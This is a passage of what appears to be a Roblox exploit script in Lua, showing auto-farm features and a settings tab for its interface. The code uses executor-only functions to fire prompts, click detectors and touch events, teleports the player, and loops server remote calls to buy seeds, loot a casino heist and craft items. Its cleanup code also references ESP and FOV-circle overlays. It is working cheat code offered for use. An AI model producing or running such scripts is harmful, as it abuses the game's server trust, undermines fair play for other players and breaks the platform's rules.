        Notify("Plant Farm", "Purchasing " .. selAmt .. "x " .. selSeed, 3)
        for i = 1, selAmt do
            game:GetService("ReplicatedStorage").Remotes.PurchaseSeed:FireServer(selSeed)
            task.wait(0.1)
        end
    end)


    local function FORCE_HOLD(prompt)
        if fireproximityprompt then
            fireproximityprompt(prompt)
        else
            prompt:InputBegan(Enum.UserInputType.MouseButton1)
            task.wait(0.04)
            prompt:InputEnded(Enum.UserInputType.MouseButton1)
        end
    end

    local function GET_PRP(root, text)
        for _, v in ipairs(root:GetDescendants()) do
            if v:IsA("ProximityPrompt") and (v.ActionText == text or v.ObjectText == text) then return v end
        end
        return nil
    end

    local function GET_TOOL(name)
        local tool = LPLR.Backpack:FindFirstChild(name)
        if tool then
            local humanoid = LPLR.Character and LPLR.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid:EquipTool(tool)
                task.wait(0.12)
                return true
            end
        elseif LPLR.Character and LPLR.Character:FindFirstChild(name) then
            return true
        end
        return false
    end

    local ccs = CreateCard(pfm, "Casino Farm")
    local CASINO_RUNNING = false
    local LAST_CASINO_TICK = 0

    local function RUN_CASINO_FARM()
        local startPrompt = workspace.SilverBackTeleport.Start:FindFirstChild("ProximityPrompt")
        if startPrompt and startPrompt.ActionText:find("Cooldown") then
            Notify("Casino Farm", "Map Cooldown active (18 mins). Sleeping...", 4)
            return false
        end

        Notify("Casino Farm", "Starting Heist...", 3)
        game:GetService("ReplicatedStorage").Events.ServerEvent:FireServer("BuyItemTool", "CasinoBag", false)
        task.wait(0.5)

        if SafeTP then SafeTP(Vector3.new(1324, 130, 390)) end
        task.wait(0.5)
        if startPrompt then fireproximityprompt(startPrompt) end

        task.wait(7)

        local function LOOT_20()
            if SafeTP then SafeTP(Vector3.new(1386, 115, 268)) end
            task.wait(1)
            local loot = {}
            local miscs = workspace.SilverBackHeist.Robbables.Miscs
            local safes = workspace.SilverBackHeist.Robbables.Safes
            for _, v in ipairs(miscs:GetDescendants()) do
                if v:IsA("ClickDetector") and (v:IsDescendantOf(miscs.Money)) then table.insert(loot, v) end
            end
            for _, v in ipairs(safes:GetDescendants()) do
                if v:IsA("ClickDetector") and v.Parent.Name == "Money" then table.insert(loot, v) end
            end
            local count = 0
            for _, cd in ipairs(loot) do
                if cd and cd.Parent and (not cd.Parent:IsA("BasePart") or cd.Parent.Transparency < 1) then
                    fireclickdetector(cd)
                    count = count + 1
                    task.wait(0.15)
                    if count >= 20 then break end
                end
            end
            if SafeTP then SafeTP(Vector3.new(980, 231, -492)) end
            task.wait(1)
            local sellPart = workspace.Map.JobModels.Bank.SellModel:FindFirstChild("DistancePart")
            if sellPart then
                firetouchinterest(LPLR.Character.HumanoidRootPart, sellPart, 0)
                task.wait(0.1)
                firetouchinterest(LPLR.Character.HumanoidRootPart, sellPart, 1)
            end
            task.wait(1)
        end

        LOOT_20()
        return true
    end

    local togCasino = CreateToggle(ccs, "Auto Casino", false, nil, function(v)
        CASINO_RUNNING = v
        if v then
            task.spawn(function()
                while CASINO_RUNNING do
                    local timeSinceLast = tick() - LAST_CASINO_TICK
                    if timeSinceLast < 300 then
                        local remain = math.ceil(300 - timeSinceLast)
                        Notify("Casino Farm", "Persistent Cooldown: " .. remain .. "s remaining", 5)
                        task.wait(remain)
                    end

                    if not CASINO_RUNNING then break end

                    local success = pcall(RUN_CASINO_FARM)
                    if success then
                        LAST_CASINO_TICK = tick()
                        Notify("Casino Farm", "Heist Finished! 5m Cooldown started.", 5)
                    else
                        task.wait(60)
                    end
                    task.wait(2)
                end
            end)
        end
    end)
    togCasino.Keybind.Visible = false

    local cae = CreateCard(pfm, "Auto Extract")
    local SEL_EXTRACT = "Green Extract"
    local SEL_QTY = 1
    local EXT_RUNNING = false

    local function FIND_AVAILABLE_STATION()
        for _, s in ipairs(workspace.Map.JobModels:GetChildren()) do
            if s:FindFirstChild("StatusPart") and s.StatusPart:FindFirstChild("DrankStatusPrompt") and s.StatusPart.DrankStatusPrompt.Enabled then
                return s
            end
        end
        return nil
    end

    local function BUY_EXT_STUFF()
        local shops = workspace.Gunshops
        local e_p = GET_PRP(shops, SEL_EXTRACT)
        if e_p then
            if SafeTP then SafeTP(e_p.Parent.Position) end
            task.wait(1)
            for i = 1, SEL_QTY do
                FORCE_HOLD(e_p); task.wait(3.2)
            end
        end

        for i = 1, SEL_QTY do
            game:GetService("ReplicatedStorage").Events.ServerEvent:FireServer("BuyItemTool", "Water", false)
            task.wait(0.3)
        end

        local s_p = GET_PRP(shops, "Sugar")
        if s_p then
            if SafeTP then SafeTP(s_p.Parent.Position) end
            task.wait(1)
            for i = 1, SEL_QTY do
                FORCE_HOLD(s_p); task.wait(3.2)
            end
        end

        local c_p = GET_PRP(shops, "Empty Cup")
        if c_p then
            if SafeTP then SafeTP(c_p.Parent.Position) end
            task.wait(1)
            for i = 1, (SEL_QTY * 2) do
                FORCE_HOLD(c_p)
                Notify("Auto Extract", "Buying Cup " .. i .. "/" .. (SEL_QTY * 2), 1)
                task.wait(3.2)
            end
        end
    end

    local extOpts = {
        { Name = "Green Extract",  Value = "Green Extract" },
        { Name = "Red Extract",    Value = "Red Extract" },
        { Name = "Blue Extract",   Value = "Blue Extract" },
        { Name = "Pink Extract",   Value = "Pink Extract" },
        { Name = "Purple Extract", Value = "Purple Extract" }
    }
    CreateDropdown(cae, "Select Extract", extOpts, nil, 1, function(val)
        SEL_EXTRACT = val
    end)

    local extQtyOpts = {
        { Name = "1", Value = 1 }, { Name = "2", Value = 2 }, { Name = "3", Value = 3 },
        { Name = "4", Value = 4 }, { Name = "5", Value = 5 }, { Name = "6", Value = 6 }
    }
    CreateDropdown(cae, "Extract Qty", extQtyOpts, nil, 1, function(val)
        SEL_QTY = tonumber(val) or 1
    end)

    local togExtract = CreateToggle(cae, "Auto Extract", false, nil, function(v)
        EXT_RUNNING = v
        if v then
            task.spawn(function()
                while EXT_RUNNING do
                    local function HAS_ING()
                        local needed = { [SEL_EXTRACT] = 1, ["Water"] = 1, ["Sugar"] = 1, ["Empty Cup"] = 2 }
                        local cur = {}
                        for _, i in ipairs(LPLR.Backpack:GetChildren()) do cur[i.Name] = (cur[i.Name] or 0) + 1 end
                        if LPLR.Character then
                            for _, i in ipairs(LPLR.Character:GetChildren()) do cur[i.Name] = (cur[i.Name] or 0) + 1 end
                        end
                        for item, qty in pairs(needed) do if (cur[item] or 0) < qty then return false end end
                        return true
                    end

                    if not HAS_ING() then
                        Notify("Auto Extract", "Shopping for ingredients...", 3)
                        BUY_EXT_STUFF()
                        task.wait(1)
                    end
                    if not EXT_RUNNING then break end

                    local ACTIVE_STATIONS = {}
                    local to_fill = SEL_QTY

                    Notify("Auto Extract", "Phase 1: Filling " .. SEL_QTY .. " stations...", 3)

                    while to_fill > 0 and EXT_RUNNING do
                        local st = FIND_AVAILABLE_STATION()
                        if st then
                            local already = false
                            for _, used in ipairs(ACTIVE_STATIONS) do
                                if used == st then
                                    already = true
                                    break
                                end
                            end

                            if not already then
                                if SafeTP then SafeTP(st.StatusPart.Position) end
                                task.wait(0.5)
                                GET_TOOL("Water"); FORCE_HOLD(st.StatusPart.DrankStatusPrompt); task.wait(1.2)
                                GET_TOOL("Sugar"); FORCE_HOLD(st.StatusPart.DrankStatusPrompt); task.wait(0.6)
                                GET_TOOL(SEL_EXTRACT); FORCE_HOLD(st.StatusPart.DrankStatusPrompt)

                                table.insert(ACTIVE_STATIONS, st)
                                to_fill = to_fill - 1
                                Notify("Auto Extract", "Station " .. #ACTIVE_STATIONS .. " started!", 2)
                            else
                                task.wait(1)
                            end
                        else
                            task.wait(2)
                        end
                    end

                    if not EXT_RUNNING then break end

                    Notify("Auto Extract", "Phase 2: Harvesting...", 3)

                    local done = 0
                    while done < SEL_QTY and EXT_RUNNING do
                        for idx, st in ipairs(ACTIVE_STATIONS) do
                            if st ~= "DONE" then
                                local cp = st.PlaceCup.DrankPlaceCupPrompt
                                if cp.Enabled then
                                    if SafeTP then SafeTP(st.StatusPart.Position) end
                                    task.wait(0.4)
                                    Notify("Auto Extract", "Adding cups to station " .. idx, 2)
                                    for _ = 1, 2 do
                                        GET_TOOL("Empty Cup"); FORCE_HOLD(cp); task.wait(0.6)
                                    end

                                    local pourP = st.Water:FindFirstChild("DrankPourPrompt")
                                    if pourP then
                                        while EXT_RUNNING and pourP.Enabled do
                                            FORCE_HOLD(pourP)
                                            task.wait(0.1)
                                        end
                                    end

                                    for _ = 1, 3 do
                                        FORCE_HOLD(cp); task.wait(0.5)
                                    end
                                    ACTIVE_STATIONS[idx] = "DONE"
                                    done = done + 1
                                    Notify("Auto Extract", "Batch " .. done .. " collected!", 2)
                                end
                            end
                        end
                        task.wait(1)
                    end
                    task.wait(2)
                end
            end)
        end
    end)
    togExtract.Keybind.Visible = false
end

local pbyp = CreateTab("Settings", "Utilities and Settings")
local ccif = CreateCard(pbyp, "Custom Interface")

local togBg = CreateToggle(ccif, "Enable Custom Image", false, "EnableImage", function(toggled)
    Config.EnableImage = toggled
    bgImg.Visible = toggled
    SaveConfig()
end)
togBg.Keybind.Visible = false

local sldTrans = CreateSlider(ccif, "Interface Transparency", 0, 100, 50, "Transparency", function(val)
    Config.Transparency = val
    bgImg.ImageTransparency = val / 100
    main.BackgroundTransparency = val / 100
    SaveConfig()
end)

local preview = Instance.new("ImageLabel")
preview.Size = UDim2.new(1, 0, 0, 60)
preview.BackgroundTransparency = 1
preview.Image = bgImg.Image
preview.ScaleType = Enum.ScaleType.Crop
preview.Parent = ccif:FindFirstChild("BBox") or ccif

local pcn = Instance.new("UICorner")
pcn.CornerRadius = UDim.new(0, 4)
pcn.Parent = preview

local inputImg = CreateInput(ccif, "Image Asset ID", "CustomImage", Config.CustomImage)
inputImg.Box.FocusLost:Connect(function()
    local inputText = inputImg.Box.Text
    local match = string.match(inputText, "%d+")

    if match then
        local newId = "rbxassetid://" .. match
        inputImg.Box.Text = newId
        bgImg.Image = newId
        preview.Image = newId
        Config.CustomImage = newId
        SaveConfig()
    else
        inputImg.Box.Text = bgImg.Image
    end
end)

local cthm = CreateCard(pbyp, "Themes / Fonts")

CreateDropdown(cthm, "Theme Color", colorOptions, "ThemeColorIdx", 1, function(val)
    SharedThemeColor = val
    ApplyTheme()
end)

CreateDropdown(cthm, "Font Style", fontOptions, "FontIdx", 1, function(val)
    SharedThemeFont = val
    ApplyTheme()
end)

local cnotif = CreateCard(pbyp, "Notifications")
local togNotif = CreateToggle(cnotif, "Enable Notifications", true, "NotificationsEnabled", function(v)
    Config.NotificationsEnabled = v
    SaveConfig()
end)
togNotif.Keybind.Visible = false

local notifPosOptions = {
    { Name = "Bottom Right", Value = "Bottom Right" },
    { Name = "Bottom Left",  Value = "Bottom Left" },
    { Name = "Top Right",    Value = "Top Right" },
    { Name = "Top Left",     Value = "Top Left" }
}
local currentPosIdx = 1
for i, opt in ipairs(notifPosOptions) do
    if opt.Value == Config.NotificationPosition then
        currentPosIdx = i
        break
    end
end

CreateDropdown(cnotif, "Notification Position", notifPosOptions, nil, currentPosIdx, function(val)
    Config.NotificationPosition = val
    UpdateNotifPosition(val)
    SaveConfig()
    Notify("Position", "Notifications moved to " .. val, 2)
end)

local cui = CreateCard(pbyp, "UI Controls")
local togHideUI = CreateToggle(cui, "Hide UI", false, "HideUIKey", function()
    main.Visible = not main.Visible
end)
togHideUI.Toggle.Visible = false

ApplyTheme()

if tabs["Main"] then
    tabs["Main"].open()
end

gui.Destroying:Connect(function()
    for _, fn in ipairs(ActiveToggles) do
        pcall(fn, true)
    end
    if FOV_CIRCLE then pcall(function() FOV_CIRCLE:Remove() end) end
    if ESP_HOLDER then pcall(function() ESP_HOLDER:Destroy() end) end
end)
